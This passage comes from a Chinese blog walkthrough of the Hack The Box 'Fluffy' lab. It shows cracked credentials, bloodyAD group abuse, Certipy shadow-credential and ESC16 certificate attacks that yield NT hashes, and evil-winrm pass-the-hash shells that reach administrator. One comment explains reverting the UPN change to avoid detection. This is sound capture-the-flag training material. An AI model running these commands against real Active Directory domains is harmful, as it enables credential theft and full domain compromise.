1/1 (100.00%)</span><br><span class="line">Speed.#1.........:   789.9 kH/s (1.58ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4517888/14344385 (31.50%)</span><br><span class="line">Rejected.........: 0/4517888 (0.00%)</span><br><span class="line">Restore.Point....: 4515840/14344385 (31.48%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: proretriever -&gt; progree</span><br><span class="line">Hardware.Mon.#1..: Util: 68%</span><br><span class="line"></span><br><span class="line">Started: Sun Jul 27 06:34:56 2025</span><br><span class="line">Stopped: Sun Jul 27 06:35:06 2025</span><br><span class="line">                                                              </span><br></pre></td></tr></table></figure>

<p>得到了P.AGILA的密码为prometheusx-303</p>
<p>我们看一下P.AGILA的权限</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250727183703987.png" alt="image-20250727183703987"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250727183936663.png" alt="image-20250727183936663"></p>
<h4 id="影子证书攻击"><a href="#影子证书攻击" class="headerlink" title="影子证书攻击"></a>影子证书攻击</h4><p>他是一个service Account manager组。这个用户可以将自己加入Service Account用户组，然后对svc用户拥有GenericWrite权限，这个权限结合CA证书服务，可以导致影子证书攻击，也就是说，我们完全可以窃取他们的hash,进一步测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# bloodyAD -d fluffy.htb -u p.agila -p &#x27;prometheusx-303&#x27; --dc-ip 10.10.11.69 add groupMember &#x27;SERVICE ACCOUNTS&#x27; p.agila</span><br><span class="line">[+] p.agila added to SERVICE ACCOUNTS</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad find -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69                                                     </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 33 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 11 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA: Could not connect: timed out</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration for &#x27;fluffy-DC01-CA&#x27;</span><br><span class="line">[*] Saved BloodHound data to &#x27;20250727134014_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to &#x27;20250727134014_Certipy.txt&#x27;</span><br><span class="line">[*] Saved JSON output to &#x27;20250727134014_Certipy.json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>看一下我们对目标账户的属性修改权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# bloodyAD -d fluffy.htb -u p.agila -p &#x27;prometheusx-303&#x27; --dc-ip 10.10.11.69 get writable --detail                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb</span><br><span class="line">url: WRITE</span><br><span class="line">wWWHomePage: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">shadowFlag: WRITE</span><br><span class="line">shadowExpire: WRITE</span><br><span class="line">shadowInactive: WRITE</span><br><span class="line">shadowWarning: WRITE</span><br><span class="line">shadowMax: WRITE</span><br><span class="line">shadowMin: WRITE</span><br><span class="line">shadowLastChange: WRITE</span><br><span class="line">loginShell: WRITE</span><br><span class="line">unixHomeDirectory: WRITE</span><br><span class="line">gecos: WRITE</span><br><span class="line">gidNumber: WRITE</span><br><span class="line">uidNumber: WRITE</span><br><span class="line">msSFU30NisDomain: WRITE</span><br><span class="line">msSFU30Name: WRITE</span><br><span class="line">labeledURI: WRITE</span><br><span class="line">userPKCS12: WRITE</span><br><span class="line">preferredLanguage: WRITE</span><br><span class="line">thumbnailLogo: WRITE</span><br><span class="line">thumbnailPhoto: WRITE</span><br><span class="line">````</span><br></pre></td></tr></table></figure>



<p><img src="/../imgs/$%7Bfiilename%7D/image-20250727192330506.png" alt="image-20250727192330506"></p>
<p>攻击者可以<strong>将自己的公钥信息写入目标用户的 <code>msDS-KeyCredentialLink</code> 属性中</strong>。一旦写入成功，域控制器就会信任这个新的公钥。攻击者就可以使用与这个公钥对应的<strong>私钥</strong>来生成一个证书或 Kerberos 票据，然后冒充目标用户进行身份验证。</p>
<p>由于攻击者可以为域中的任何用户伪造一个有效的公钥凭据，如果目标用户是域管理员，攻击者就能以域管理员身份登录，实现权限升级。</p>
<p>执行影子证书攻击，窃取winrm_svc用户的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad shadow auto -debug -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account &#x27;winrm_svc&#x27; -target dc01.fluffy.htb -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;dc01.fluffy.htb&#x27; at &#x27;10.10.11.69&#x27;</span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Bound to ldaps://10.10.11.69:636 - ssl</span><br><span class="line">[+] Default path: DC=fluffy,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">[*] Targeting user &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27;</span><br><span class="line">&lt;KeyCredential structure at 0x7f0b38d54050&gt;</span><br><span class="line">  | Owner: CN=winrm service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">  | Version: 0x200</span><br><span class="line">  | KeyID: Oxq4/4W2f43XCTsLj1HiG8ca7dKNJGE7JqBXquQfqN4=</span><br><span class="line">  | KeyHash: 8a412cd101147142e8adc9245b594b8a059bd3a65c9df02765f9536432dad160</span><br><span class="line">  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7f0b3907bd90&gt;</span><br><span class="line">  |  | Exponent (E): 65537</span><br><span class="line">  |  | Modulus (N): 0xcf126d263713ac29300f96235d6e90062a24b425deaf92ab717b9052859dc9e985ab98bacdedc98386c85a64eafa70a6f820cd2389c3fdf83f788f6ad30262c7e733f504f573c2f4c38694307b00581cf10dffc4150895ad9ebe63209c0d04443f2f3049579d8af853c29630eae2f5774d7014fc2e3b971143ce61b3b6202143bc0521bbb5a4431c67d22ff444d6ef98eed6be73c01456b076863d1a1de92edeb50bff4660fa3e5b8e0fc40b3fd19809648b010589e2733da0949de1c0a0c9723c7914b2e52ca6235452e226c1e98f69b47db6cd7e2da0e2f23d62cac8f4a0a1effc6833cdd34fb7f9ccfd481c87a03eedcec5d271e32b9de1674ac081e321c1</span><br><span class="line">  |  | Prime1 (P): 0x0</span><br><span class="line">  |  | Prime2 (Q): 0x0</span><br><span class="line">  | Usage: KeyUsage.NGC</span><br><span class="line">  | LegacyUsage: None</span><br><span class="line">  | Source: KeySource.AD</span><br><span class="line">  | DeviceId: 5d3553d2-81b4-8f70-e7ad-bc195c5a218d</span><br><span class="line">  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7f0b38d03e80&gt;</span><br><span class="line">  |  | Version: 1</span><br><span class="line">  |  | Flags: KeyFlags.NONE</span><br><span class="line">  |  | VolumeType: None</span><br><span class="line">  |  | SupportsNotification: None</span><br><span class="line">  |  | FekKeyVersion: None</span><br><span class="line">  |  | Strength: None</span><br><span class="line">  |  | Reserved: None</span><br><span class="line">  |  | EncodedExtendedCKI: None</span><br><span class="line">  | LastLogonTime (UTC): 2025-07-27 18:09:41.322062</span><br><span class="line">  | CreationTime (UTC): 2025-07-27 18:09:41.322062</span><br><span class="line">[+] Key Credential: B:828:000200002000013b1ab8ff85b67f8dd7093b0b8f51e21bc71aedd28d24613b26a057aae41fa8de2000028a412cd101147142e8adc9245b594b8a059bd3a65c9df02765f9536432dad1601b0103525341310008000003000000000100000000000000000000010001cf126d263713ac29300f96235d6e90062a24b425deaf92ab717b9052859dc9e985ab98bacdedc98386c85a64eafa70a6f820cd2389c3fdf83f788f6ad30262c7e733f504f573c2f4c38694307b00581cf10dffc4150895ad9ebe63209c0d04443f2f3049579d8af853c29630eae2f5774d7014fc2e3b971143ce61b3b6202143bc0521bbb5a4431c67d22ff444d6ef98eed6be73c01456b076863d1a1de92edeb50bff4660fa3e5b8e0fc40b3fd19809648b010589e2733da0949de1c0a0c9723c7914b2e52ca6235452e226c1e98f69b47db6cd7e2da0e2f23d62cac8f4a0a1effc6833cdd34fb7f9ccfd481c87a03eedcec5d271e32b9de1674ac081e321c10100040101000500100006d253355db481708fe7adbc195c5a218d0200070100080008f9848a9f21ffdb01080009f9848a9f21ffdb01:CN=winrm service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;winrm_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: winrm_svc@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;winrm_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;winrm_svc&#x27;: 33bd09dcd697600edf6b3a7af4875767</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功获取了 <code>WINRM_SVC</code> 用户的 NT 哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.69 -u &#x27;WINRM_SVC&#x27; -H &#x27;33bd09dcd697600edf6b3a7af4875767&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc&gt; cd desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\desktop&gt; type user.txt</span><br><span class="line">cc89*****************</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功拿到userflag</p>
<p>我们再拿一下ca_svc用户的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ntpdate 10.10.11.69</span><br><span class="line">2025-07-27 16:15:49.117859 (-0400) +3381.164582 +/- 0.336972 10.10.11.69 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 3381.164582</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad shadow auto -debug -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account &#x27;ca_svc&#x27; -target dc01.fluffy.htb -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;dc01.fluffy.htb&#x27; at &#x27;10.10.11.69&#x27;</span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Bound to ldaps://10.10.11.69:636 - ssl</span><br><span class="line">[+] Default path: DC=fluffy,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">[*] Targeting user &#x27;ca_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27;</span><br><span class="line">&lt;KeyCredential structure at 0x7f66a40bfc50&gt;</span><br><span class="line">  | Owner: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">  | Version: 0x200</span><br><span class="line">  | KeyID: Ohnn3EPYflTVG80nuKy52xET0rM7YCqLDT+uamRAOEk=</span><br><span class="line">  | KeyHash: 2910c4f1a2f7374ae1d67e14e8f51e69a2959c80331fc0aafe4da485ebc2d3a9</span><br><span class="line">  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7f66a40bf9d0&gt;</span><br><span class="line">  |  | Exponent (E): 65537</span><br><span class="line">  |  | Modulus (N): 0xe4956bc832b77c9484d8603b4001ca7147376c1a6d0a2165d594426c6417a28a699b78d2a59ee4f7db2b819355ae393bc4878bc3e6a65ba048a3681353774f70c6b3b1d98736ba0e6c7fbeb92799b05bac509f492ed3919299e9debfab73fb9d93226fc3d482139d8e2d8e1eb36f1a8f694e5663ddbddd3afb836eda776a39b221feace0215c18ca49de8761b08383680bc34a6de86d6d5767bb7ca20d12886fe231a06909931422e2f68808fc7a84eb1ebccb509eeec07f212c17b3e2687625edcc35f47c39d0b9d9f0bec40b33218f598389c83c5cfa3211f4a6db8fa77848b75c0cae54bab7e6d68483495c1a716652a335973eae8eec54db8aa47b63ec6b</span><br><span class="line">  |  | Prime1 (P): 0x0</span><br><span class="line">  |  | Prime2 (Q): 0x0</span><br><span class="line">  | Usage: KeyUsage.NGC</span><br><span class="line">  | LegacyUsage: None</span><br><span class="line">  | Source: KeySource.AD</span><br><span class="line">  | DeviceId: 0e40c569-4e25-5ca5-c416-b04df7c3dd51</span><br><span class="line">  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7f66a3d5fc50&gt;</span><br><span class="line">  |  | Version: 1</span><br><span class="line">  |  | Flags: KeyFlags.NONE</span><br><span class="line">  |  | VolumeType: None</span><br><span class="line">  |  | SupportsNotification: None</span><br><span class="line">  |  | FekKeyVersion: None</span><br><span class="line">  |  | Strength: None</span><br><span class="line">  |  | Reserved: None</span><br><span class="line">  |  | EncodedExtendedCKI: None</span><br><span class="line">  | LastLogonTime (UTC): 2025-07-27 20:17:15.073256</span><br><span class="line">  | CreationTime (UTC): 2025-07-27 20:17:15.073256</span><br><span class="line">[+] Key Credential: B:828:000200002000013a19e7dc43d87e54d51bcd27b8acb9db1113d2b33b602a8b0d3fae6a644038492000022910c4f1a2f7374ae1d67e14e8f51e69a2959c80331fc0aafe4da485ebc2d3a91b0103525341310008000003000000000100000000000000000000010001e4956bc832b77c9484d8603b4001ca7147376c1a6d0a2165d594426c6417a28a699b78d2a59ee4f7db2b819355ae393bc4878bc3e6a65ba048a3681353774f70c6b3b1d98736ba0e6c7fbeb92799b05bac509f492ed3919299e9debfab73fb9d93226fc3d482139d8e2d8e1eb36f1a8f694e5663ddbddd3afb836eda776a39b221feace0215c18ca49de8761b08383680bc34a6de86d6d5767bb7ca20d12886fe231a06909931422e2f68808fc7a84eb1ebccb509eeec07f212c17b3e2687625edcc35f47c39d0b9d9f0bec40b33218f598389c83c5cfa3211f4a6db8fa77848b75c0cae54bab7e6d68483495c1a716652a335973eae8eec54db8aa47b63ec6b010004010100050010000669c5400e254ea55cc416b04df7c3dd5102000701000800081145887133ffdb010800091145887133ffdb01:CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;ca_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: ca_svc@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;ca_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;ca_svc&#x27;: ca0f4f9e9eb8a092addf53bb03fc98c8</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="CA-证书模板漏洞攻击-ESC16"><a href="#CA-证书模板漏洞攻击-ESC16" class="headerlink" title="CA 证书模板漏洞攻击 - ESC16"></a>CA 证书模板漏洞攻击 - ESC16</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─#certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</span><br><span class="line"></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 33 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 11 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA: Could not connect: timed out</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration for &#x27;fluffy-DC01-CA&#x27;</span><br><span class="line">[*] Saved BloodHound data to &#x27;20250727150414_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to &#x27;20250727150414_Certipy.txt&#x27;</span><br><span class="line">[*] Saved JSON output to &#x27;20250727150414_Certipy.json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>CA 名称:fluffy-DC01-CA</p>
<p>可将zip导入bloodhound观察进攻线路</p>
<p>以 <code>ca_svc</code> 用户的身份和哈希，向 <code>fluffy-DC01-CA</code> 请求一个基于 <code>User</code> 模板的证书。获得一个冒充 <code>Administrator</code> 用户的数字证书和私钥。</p>
<p>使用刚刚获得的 <code>administrator.pfx</code> 证书，尝试以 <code>administrator</code> 用户的身份对 <code>fluffy.htb</code> 域进行身份验证,获得hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# export KRB5CCNAME=ca_svc.ccache</span><br><span class="line"> //设置环境变量 KRB5CCNAME，指向 ca_svc 用户的 Kerberos 凭据缓存文件。                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad account -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -upn &#x27;administrator&#x27; -user &#x27;ca_svc&#x27; update</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_svc&#x27;:</span><br><span class="line">    userPrincipalName                   : administrator</span><br><span class="line">[*] Successfully updated &#x27;ca_svc&#x27;</span><br><span class="line">                                                                                                             </span><br><span class="line">// 使用 ca_svc 的哈希，将 ca_svc 账户的 userPrincipalName (UPN) 属性修改为 administrator。                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ntpdate 10.10.11.69</span><br><span class="line">2025-07-28 08:48:45.139284 (-0400) +47.012763 +/- 0.096627 10.10.11.69 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 47.012763</span><br><span class="line">                                                                                                             // 再次同步 Kali Linux 机器的时间与目标域控制器的时间。                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad req -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -target &#x27;DC01.fluffy.htb&#x27; -ca &#x27;fluffy-DC01-CA&#x27; -template &#x27;User&#x27;</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 24</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">                                                                                                              // 以 ca_svc 用户的身份和哈希，向 fluffy-DC01-CA 请求一个基于 User 模板的证书。                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad account -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -upn &#x27;ca_svc@fluffy.htb&#x27; -user &#x27;ca_svc&#x27; update </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_svc&#x27;:</span><br><span class="line">    userPrincipalName                   : ca_svc@fluffy.htb</span><br><span class="line">[*] Successfully updated &#x27;ca_svc&#x27;</span><br><span class="line">                                                                                                              //在成功获取证书后，将 ca_svc 账户的 userPrincipalName (UPN) 属性恢复到其原始的 ca_svc@fluffy.htb,避免在 Active Directory 中留下可疑的 UPN 更改                                             </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad auth -pfx administrator.pfx -username &#x27;administrator&#x27; -domain &#x27;fluffy.htb&#x27; -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@fluffy.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</span><br><span class="line">                                                                                                             //使用刚刚获得的 administrator.pfx 证书，尝试以 administrator 用户的身份对 fluffy.htb 域进行身份验证。获取了 Administrator 用户的 NTLM 哈希                                                                                 </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.69 -u administrator -H &#x27;8da83a3fa618b6e3a00e93f676c92a6e&#x27; </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span><br><span class="line">fbb4e8*************************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br><span class="line">//得到rootflag</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/07/28/htb-season8-2-fluffy/">http://example.com/2025/07/28/htb-season8-2-fluffy/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/28/htb-season8-1-puppy/" title="htb-season8.1-puppy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">htb-season8.1-puppy</div></div><div class="info-2"><div class="info-item-1"> 信息收集┌──(root㉿kali)-[/myift/bachang/htb/8/1]└─# nmap -p- --min-rate 10000 -oN ports.txt 10.10.11.70Nmap scan report for 10.10.11.70Host is up (0.19s latency).Not shown: 65516 filtered tcp ports (no-response)PORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec111/tcp   open  rpcbind135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5636/tcp   open  ldapssl2049/tcp  open  nfs3260/tcp  open  iscsi3268/tcp ...</div></div></div></a><a class="pagination-related" href="/2025/07/28/hackmyvm-zero/" title="hackmyvm-zero"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm-zero</div></div><div class="info-2"><div class="info-item-1"> ┌──(root㉿kali)-[~]└─# arp-scan -I eth1 192.168.56.0/24WARNING: Could not obtain IP address for interface eth1. Using 0.0.0.0 forthe source address, which may not be what you want.Either configure eth1 with an IP address, or manually specify the addresswith the --arpspa option.Interface: eth1, type: EN10MB, MAC: 00:0c:29:96:80:36, IPv4: (none)Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas 